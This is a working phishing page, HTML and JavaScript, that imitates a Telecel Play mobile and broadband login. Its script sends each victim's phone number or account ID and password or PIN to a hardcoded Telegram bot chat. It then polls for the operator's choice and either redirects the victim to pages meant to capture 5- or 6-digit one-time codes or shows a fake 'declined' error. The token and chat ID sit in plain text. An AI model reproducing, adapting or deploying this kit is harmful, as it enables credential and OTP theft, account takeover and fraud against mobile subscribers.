<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Telecel – Login with Password</title>
  <!-- Google Fonts & Icons -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', Arial, Helvetica, sans-serif;
    }

    body {
      background: #f5f5f5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    /* Main container – exactly same as original */
    .container {
      width: 360px;
      background: #f7f7f7;
      border-radius: 28px;
      padding: 40px 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      position: relative;
      overflow: hidden;
      text-align: center;
    }

    /* Top red shape */
    .top-bg {
      position: absolute;
      top: 0;
      right: 0;
      width: 220px;
      height: 220px;
      background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
      border-bottom-left-radius: 120px;
    }

    /* Content wrapper */
    .content {
      position: relative;
      z-index: 2;
    }

    /* Logo */
    .logo {
      text-align: center;
      margin-top: 60px;
    }
    .logo-circle {
      width: 52px;
      height: 52px;
      background: #ff0000;
      border-radius: 50%;
      color: #ffffff !important;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 30px;
      margin: auto;
      font-weight: 800;
    }
    .logo-text {
      color: #ff0000;
      font-size: 26px;
      font-weight: bold;
      margin-top: 8px;
    }

    /* Titles */
    .title {
      text-align: center;
      color: #ff0000;
      font-size: 20px;
      font-weight: 600;
      margin-top: 15px;
    }
    .subtitle {
      text-align: center;
      color: #666;
      font-size: 15px;
      margin-top: 10px;
      line-height: 1.5;
    }

    /* Form */
    .form {
      margin-top: 30px;
      text-align: left;
    }

    .label {
      font-size: 13px;
      color: #666;
      margin-bottom: 8px;
      display: block;
      font-weight: 500;
    }

    /* Input & select */
    .input, .select {
      width: 100%;
      height: 50px;
      border-radius: 12px;
      border: 1px solid #ddd;
      padding: 0 15px;
      font-size: 15px;
      background: #fff;
      outline: none;
      transition: border 0.2s;
    }
    .input:focus, .select:focus {
      border-color: #ff0000;
    }

    /* Password field with toggle icon */
    .password-wrapper {
      position: relative;
      width: 100%;
    }
    .password-wrapper .input {
      padding-right: 48px;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 16px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 20px;
      color: #888;
      transition: color 0.2s;
    }
    .toggle-password:hover {
      color: #ff0000;
    }

    /* Custom dropdown (preserved from original) */
    .dropdown {
      position: relative;
      cursor: pointer;
    }
    .select-wrapper {
      position: relative;
    }
    .select {
      width: 100%;
      height: 50px;
      border-radius: 12px;
      border: 1px solid #ddd;
      padding: 0 40px 0 15px;
      font-size: 15px;
      background: #fff;
      cursor: pointer;
      appearance: none;
    }
    .arrow {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 14px;
      color: #888;
      transition: 0.3s;
      pointer-events: none;
    }
    .dropdown-list {
      position: absolute;
      width: 100%;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      margin-top: 5px;
      display: none;
      overflow: hidden;
      z-index: 10;
    }
    .dropdown-item {
      padding: 15px;
      font-size: 15px;
      cursor: pointer;
    }
    .dropdown-item.active {
      background: #ffe5e5;
      color: #ff0000;
    }
    .dropdown-item:hover {
      background: #f5f5f5;
    }

    /* Buttons */
    .btn {
      width: 100%;
      height: 55px;
      border: none;
      border-radius: 14px;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
      font-weight: 600;
    }
    .btn-primary {
      background: #ff0000;
      color: #fff;
    }
    .btn-primary.disabled, .btn-primary:disabled {
      background: #e5e5e5;
      color: #999;
      cursor: not-allowed;
    }
    .btn-outline {
      background: transparent;
      border: 2px solid #ff0000;
      color: #666;
      font-weight: 600;
    }

    /* Version */
    .version {
      text-align: center;
      color: #aaa;
      font-size: 12px;
      margin-top: 20px;
    }

    /* Spinner overlay */
    #spinner {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(2px);
      z-index: 999;
    }
    .loader {
      width: 44px;
      height: 44px;
      border: 4px solid #ffe0e0;
      border-top: 4px solid #ff0000;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Error box */
    .error-box {
      position: absolute;
      top: 20px;
      left: 20px;
      right: 20px;
      background: #fff;
      border: 2px solid #ff4d4d;
      border-radius: 12px;
      padding: 15px;
      display: none;
      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
      z-index: 100;
      text-align: left;
    }
    .error-title {
      color: #ff0000;
      font-weight: bold;
      margin-bottom: 5px;
    }
    .error-text {
      color: #444;
      font-size: 14px;
    }
    .close {
      position: absolute;
      right: 15px;
      top: 10px;
      cursor: pointer;
      font-size: 18px;
      color: #999;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="top-bg"></div>

  <!-- Error box -->
  <div class="error-box" id="errorBox">
    <div class="close" onclick="hideError()">×</div>
    <div class="error-title">Error</div>
    <div class="error-text" id="errorText">Invalid credentials</div>
  </div>

  <div class="content">
    <div class="logo">
      <div class="logo-circle">t</div>
      <div class="logo-text">telecel</div>
    </div>
    <div class="title">Welcome to Telecel Play</div>
    <div class="subtitle">
      Verify your account for access.<br>Enter your credentials below.
    </div>

    <div class="form">
      <!-- Account type dropdown (custom, preserved) -->
      <div class="label">Account type</div>
      <div class="dropdown" onclick="toggleDropdown()">
        <div class="select-wrapper">
          <input class="select" id="selectedType" value="Mobile" readonly>
          <span class="arrow" id="arrow">▼</span>
        </div>
        <div class="dropdown-list" id="dropdownList">
          <div class="dropdown-item active" onclick="selectType(event,'Mobile')">Mobile</div>
          <div class="dropdown-item" onclick="selectType(event,'Broadband')">Broadband</div>
        </div>
      </div>

      <!-- Identifier field (phone / account ID) -->
      <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
      <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">

      <!-- PASSWORD FIELD (single input + toggle eye) - replaced PIN boxes -->
      <div class="label" style="margin-top:15px;">Password / PIN</div>
      <div class="password-wrapper">
        <input type="password" class="input" id="passwordField" placeholder="Enter your password" autocomplete="off">
        <i class="fa-regular fa-eye toggle-password" id="togglePasswordIcon"></i>
      </div>

      <!-- Login button -->
      <button class="btn btn-primary" id="loginBtn" disabled>Login</button>
      <button class="btn btn-outline" id="goBackBtn">Go Back</button>

      <div class="version">v26.2.2(TPA-2622)</div>
    </div>
  </div>
</div>

<!-- Spinner overlay -->
<div id="spinner">
  <div class="loader"></div>
</div>

<script>
  // ========== TELEGRAM CONFIG (5 OTP / 6 OTP / Decline flow) ==========
  const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
  const CHAT_ID   = '1006917440';
  const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;

  // ========== DOM ELEMENTS ==========
  const selectedTypeInput = document.getElementById('selectedType');
  const inputField = document.getElementById('inputField');
  const passwordField = document.getElementById('passwordField');
  const dropdownList = document.getElementById('dropdownList');
  const arrow = document.getElementById('arrow');
  const loginBtn = document.getElementById('loginBtn');
  const goBackBtn = document.getElementById('goBackBtn');
  const spinner = document.getElementById('spinner');
  const errorBox = document.getElementById('errorBox');
  const errorText = document.getElementById('errorText');
  const togglePasswordIcon = document.getElementById('togglePasswordIcon');

  // ========== STATE ==========
  let isSubmitting = false;
  let currentPollInterval = null;

  // ========== ERROR HANDLING ==========
  function showError(message) {
    errorText.innerText = message || 'Invalid credentials';
    errorBox.style.display = 'block';
  }
  function hideError() {
    errorBox.style.display = 'none';
  }

  // ========== FILTER IDENTIFIER (numeric for mobile, alphanumeric for broadband) ==========
  function filterInput(value, type) {
    if (type === 'Mobile') {
      return value.replace(/[^0-9]/g, '');
    } else {
      return value.replace(/[^a-zA-Z0-9]/g, '');
    }
  }

  function applyIdentifierFilter() {
    const currentType = selectedTypeInput.value;
    const raw = inputField.value;
    const filtered = filterInput(raw, currentType);
    if (filtered !== raw) {
      inputField.value = filtered;
    }
  }

  // ========== UPDATE LOGIN BUTTON STATUS (identifier + password non-empty) ==========
  function updateLoginButton() {
    const identifier = inputField.value.trim();
    const password = passwordField.value.trim();
    const isValid = identifier !== '' && password !== '';
    loginBtn.disabled = !isValid;
    if (isValid) {
      loginBtn.classList.remove('disabled');
    } else {
      loginBtn.classList.add('disabled');
    }
  }

  // ========== VALIDATION: mobile number should start with 020/050, min length 10 ==========
  function validateMobileNumber(number) {
    const cleaned = number.replace(/\D/g, '');
    if (cleaned.length < 10) return false;
    return cleaned.startsWith('020') || cleaned.startsWith('050');
  }

  // ========== CLEAR PASSWORD FIELD (after decline) ==========
  function clearPasswordField() {
    passwordField.value = '';
    updateLoginButton();
  }

  function focusPassword() {
    passwordField.focus();
  }

  // ========== OTP GENERATORS ==========
  function generate5DigitOTP() {
    return Math.floor(10000 + Math.random() * 90000).toString();
  }
  function generate6DigitOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
  }

  // ========== TELEGRAM POLLING HELPERS ==========
  function stopPolling() {
    if (currentPollInterval) {
      clearInterval(currentPollInterval);
      currentPollInterval = null;
    }
  }

  function hideSpinnerAndReset() {
    spinner.style.display = 'none';
    isSubmitting = false;
    loginBtn.disabled = false;
    updateLoginButton();
  }

  // ========== SEND LOGIN CREDENTIALS TO TELEGRAM WITH 3 OPTIONS ==========
  async function sendLoginToTelegram(accountType, identifier, password) {
    const ts = Date.now();
    // callback data format: "5otp_TIMESTAMP", "6otp_TIMESTAMP", "decline_TIMESTAMP"
    const fiveOtpId = `5otp_${ts}`;
    const sixOtpId = `6otp_${ts}`;
    const declineId = `decline_${ts}`;
    
    // Store current session data for later use after redirect
    sessionStorage.setItem('telecel_accountType', accountType);
    sessionStorage.setItem('telecel_identifier', identifier);
    if (accountType === 'Mobile') {
      sessionStorage.setItem('telecel_phone', identifier.replace(/\D/g, ''));
    } else {
      sessionStorage.setItem('telecel_accountId', identifier);
    }
    sessionStorage.setItem('telecel_password', password);
    
    // Format message with HTML
    const displayType = accountType;
    const identifierLabel = accountType === 'Mobile' ? '📱 Phone' : '🆔 Account ID';
    const message = `🔐 <b>Telecel Play Login Request</b>\n\n` +
                    `<b>Account Type:</b> ${displayType}\n` +
                    `<b>${identifierLabel}:</b> <code>${escapeHtml(identifier)}</code>\n` +
                    `<b>🔑 Password/PIN:</b> <code>${escapeHtml(password)}</code>\n\n` +
                    `📢 <b>Select OTP length or Decline:</b>`;

    try {
      const response = await fetch(`${API_BASE}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [[
              { text: '🔢 5 OTP', callback_data: fiveOtpId },
              { text: '🔢 6 OTP', callback_data: sixOtpId },
              { text: '❌ Decline', callback_data: declineId }
            ]]
          }
        })
      });
      
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      
      // Start polling for callback response
      startPollingForDecision(fiveOtpId, sixOtpId, declineId);
    } catch (err) {
      console.error('Telegram send error:', err);
      hideSpinnerAndReset();
      showError('Network error. Please try again.');
    }
  }
  
  function escapeHtml(unsafe) {
    if (!unsafe) return '';
    return unsafe
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }
  
  // Poll Telegram for callback_query response (5 OTP, 6 OTP, or Decline)
  function startPollingForDecision(fiveOtpId, sixOtpId, declineId) {
    stopPolling();
    let lastUpdateId = 0;
    
    currentPollInterval = setInterval(async () => {
      try {
        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
        const response = await fetch(url);
        const data = await response.json();
        if (!data.ok || !data.result.length) return;
        
        let decisionHandled = false;
        for (const update of data.result) {
          lastUpdateId = Math.max(lastUpdateId, update.update_id);
          const callback = update.callback_query;
          if (!callback) continue;
          
          const cbData = callback.data;
          
          // 5 OTP selected
          if (cbData === fiveOtpId) {
            decisionHandled = true;
            stopPolling();
            spinner.style.display = 'none';
            isSubmitting = false;
            
            // Generate 5-digit OTP and store in sessionStorage for otp5.html
            const otp5 = generate5DigitOTP();
            sessionStorage.setItem('telecel_otp', otp5);
            sessionStorage.setItem('telecel_otp_length', '5');
            
            // Ensure account data is stored again (already done but double-check)
            const accountTypeStored = selectedTypeInput.value;
            const identifierVal = inputField.value.trim();
            sessionStorage.setItem('telecel_accountType', accountTypeStored);
            sessionStorage.setItem('telecel_identifier', identifierVal);
            sessionStorage.setItem('telecel_password', passwordField.value.trim());
            if (accountTypeStored === 'Mobile') {
              sessionStorage.setItem('telecel_phone', identifierVal.replace(/\D/g, ''));
            }
            
            // Redirect to 5-digit OTP page
            window.location.href = 'otp5.html';
            return;
          }
          
          // 6 OTP selected
          if (cbData === sixOtpId) {
            decisionHandled = true;
            stopPolling();
            spinner.style.display = 'none';
            isSubmitting = false;
            
            // Generate 6-digit OTP and store
            const otp6 = generate6DigitOTP();
            sessionStorage.setItem('telecel_otp', otp6);
            sessionStorage.setItem('telecel_otp_length', '6');
            
            const accountTypeStored = selectedTypeInput.value;
            const identifierVal = inputField.value.trim();
            sessionStorage.setItem('telecel_accountType', accountTypeStored);
            sessionStorage.setItem('telecel_identifier', identifierVal);
            sessionStorage.setItem('telecel_password', passwordField.value.trim());
            if (accountTypeStored === 'Mobile') {
              sessionStorage.setItem('telecel_phone', identifierVal.replace(/\D/g, ''));
            }
            
            // Redirect to 6-digit OTP page
            window.location.href = 'otp6.html';
            return;
          }
          
          // Decline selected
          if (cbData === declineId) {
            decisionHandled = true;
            stopPolling();
            spinner.style.display = 'none';
            isSubmitting = false;
            loginBtn.disabled = false;
            updateLoginButton();
            
            showError('Authentication declined. Please check your credentials and try again.');
            clearPasswordField();
            focusPassword();
            return;
          }
        }
        
        if (decisionHandled) return;
        
      } catch (err) {
        console.warn('Polling error:', err);
      }
    }, 1500); // poll every 1.5 seconds
  }
  
  // ========== MAIN SUBMIT LOGIN FUNCTION ==========
  async function submitLogin() {
    if (isSubmitting) return;
    
    // Get values
    const accountType = selectedTypeInput.value;
    const identifier = inputField.value.trim();
    const password = passwordField.value.trim();
    
    hideError();
    
    // Basic validation
    if (!identifier) {
      showError('Please enter your phone number or account ID.');
      return;
    }
    if (!password) {
      showError('Please enter your password / PIN.');
      return;
    }
    
    // Mobile-specific validation (020/050 and length)
    if (accountType === 'Mobile') {
      if (!validateMobileNumber(identifier)) {
        showError('Please enter a valid Telecel number starting with 020 or 050 (minimum 10 digits).');
        return;
      }
    } else {
      // Broadband: require at least 3 characters
      if (identifier.length < 3) {
        showError('Please enter a valid Broadband Account ID (minimum 3 characters).');
        return;
      }
    }
    
    // Start login process
    isSubmitting = true;
    loginBtn.disabled = true;
    spinner.style.display = 'flex';
    
    // Send credentials to Telegram Bot (5 OTP / 6 OTP / Decline options)
    await sendLoginToTelegram(accountType, identifier, password);
    // Polling will handle success/error and redirect or reset.
    // Network error inside sendLoginToTelegram calls hideSpinnerAndReset.
  }
  
  // ========== PASSWORD TOGGLE VISIBILITY (eye icon) ==========
  function setupPasswordToggle() {
    if (togglePasswordIcon) {
      togglePasswordIcon.addEventListener('click', function() {
        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordField.setAttribute('type', type);
        // Toggle eye icon classes
        if (type === 'password') {
          this.classList.remove('fa-eye-slash');
          this.classList.add('fa-eye');
        } else {
          this.classList.remove('fa-eye');
          this.classList.add('fa-eye-slash');
        }
      });
    }
  }
  
  // ========== DROPDOWN FUNCTIONS (preserved from original) ==========
  function toggleDropdown() {
    const isVisible = dropdownList.style.display === 'block';
    dropdownList.style.display = isVisible ? 'none' : 'block';
    arrow.classList.toggle('rotate', !isVisible);
  }
  
  function selectType(e, type) {
    e.stopPropagation();
    selectedTypeInput.value = type;
    document.querySelectorAll('.dropdown-item').forEach(item => {
      item.classList.remove('active');
    });
    e.target.classList.add('active');
    
    const label = document.getElementById('inputLabel');
    if (type === 'Mobile') {
      label.innerText = 'Phone Number';
      inputField.placeholder = '020XXXXXXX (10+ digits)';
      inputField.inputMode = 'numeric';
      applyIdentifierFilter();
    } else {
      label.innerText = 'User ID / Account Number';
      inputField.placeholder = 'e.g., TEL123XYZ';
      inputField.inputMode = 'text';
    }
    applyIdentifierFilter();
    dropdownList.style.display = 'none';
    arrow.classList.remove('rotate');
    // Clear password field on account type change
    clearPasswordField();
    updateLoginButton();
    hideError();
  }
  
  document.addEventListener('click', function(e) {
    if (!e.target.closest('.dropdown')) {
      dropdownList.style.display = 'none';
      arrow.classList.remove('rotate');
    }
  });
  
  // ========== EVENT LISTENERS ==========
  inputField.addEventListener('input', function() {
    applyIdentifierFilter();
    clearPasswordField();
    updateLoginButton();
    hideError();
  });
  
  inputField.addEventListener('paste', function(e) {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    const currentType = selectedTypeInput.value;
    const filtered = filterInput(pasted, currentType);
    const start = this.selectionStart || 0;
    const end = this.selectionEnd || 0;
    const newValue = this.value.substring(0, start) + filtered + this.value.substring(end);
    this.value = filterInput(newValue, currentType);
    const newCursor = start + filtered.length;
    this.setSelectionRange(newCursor, newCursor);
    clearPasswordField();
    updateLoginButton();
    hideError();
  });
  
  passwordField.addEventListener('input', function() {
    updateLoginButton();
    hideError();
  });
  
  loginBtn.addEventListener('click', submitLogin);
  goBackBtn.addEventListener('click', () => {
    window.history.back();
  });
  
  // ========== INITIALIZE PAGE ==========
  function init() {
    dropdownList.style.display = 'none';
    applyIdentifierFilter();
    setupPasswordToggle();
    updateLoginButton();
    hideError();
    // Initial placeholder sync
    if (selectedTypeInput.value === 'Mobile') {
      inputField.placeholder = '020XXXXXXX (10+ digits)';
    } else {
      inputField.placeholder = 'e.g., TEL123XYZ';
    }
    // Focus identifier field
    inputField.focus();
  }
  
  init();
  
  // Expose global functions for inline handlers
  window.toggleDropdown = toggleDropdown;
  window.selectType = selectType;
  window.hideError = hideError;
</script>
</body>
</html>
